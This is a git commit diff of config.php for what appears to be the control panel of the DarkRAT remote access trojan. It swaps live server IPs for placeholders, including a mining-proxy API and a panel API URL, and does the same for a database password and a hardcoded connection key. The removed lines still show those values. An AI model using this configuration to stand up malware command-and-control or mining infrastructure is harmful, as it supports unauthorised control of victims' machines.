2a29698bba64ef1abb98997e9100240dfe37d841
DarkSpider <43312963+darkspiderbots@users.noreply.github.com>
2019-06-05 22:07:50 +0200

    Added Config
    Added Config

--- Panel/darkrat_1.1.0/config.php
+++ Panel/darkrat_1.1.0/config.php
@@ -3,12 +3,12 @@
 
 $config = array(
     "connectionkey" => "otO3BA0&_YwGh5y966sfpW#mC_uIRMV#",
-    "miningProxyApi" => "http://31.214.240.105:8088",
-    "apiurl" => "http://91.200.100.153/projects/darkrat/API/",
+    "miningProxyApi" => "http://0.0.0.0:8088",
+    "apiurl" => "http://0.0.0.0/projects/darkrat/API/",
     "dbhost" => "localhost",
-    "dbuser" => "root",
-    "dbpass" => "hobbit36",
-    "dbname" => "darkrat2",
+    "dbuser" => "username",
+    "dbpass" => "password",
+    "dbname" => "database",
 );
 
 $odb = new PDO("mysql:host=".$config['dbhost'].";dbname=".$config["dbname"], $config["dbuser"], $config["dbpass"]);
